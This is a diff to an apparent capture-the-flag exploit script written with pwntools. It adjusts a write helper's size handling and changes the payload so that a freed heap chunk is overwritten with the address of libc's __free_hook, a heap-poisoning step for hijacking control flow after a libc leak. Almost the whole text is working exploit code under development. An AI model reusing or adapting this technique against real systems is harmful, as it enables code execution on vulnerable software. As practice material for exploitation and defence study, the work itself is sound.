@@ -78,9 +78,10 @@ def get_leak_libc(r):
 	r.unrecv(b"0x")
 	return bytes2int(r.recvline(keepends=False))
 
+#it does string size+1 caus it accounts also for the \n character
 def write(r, a, data, size):
 	r.clean()
-	send(r, "write " + str(a) + " " + str(size))
+	send(r, "write " + str(a) + " " + str(size+1))
 	r.recvline()
 	send(r, data)
 	r.recvuntil(b"==> done")
@@ -133,6 +134,9 @@ print("leak libc", hex(LIBC.address))
 
 a = alloc(r, 0x20)
 free(r, a)
-write(r, a, "ciao", 4)
+write(r, a, LIBC.symbols["__free_hook"] - 0x10, len(str(LIBC.symbols["__free_hook"] - 0x10)))
 alloc(r, 0x20)
+alloc(r, 0x20)
+input("wait")
+
 r.interactive()
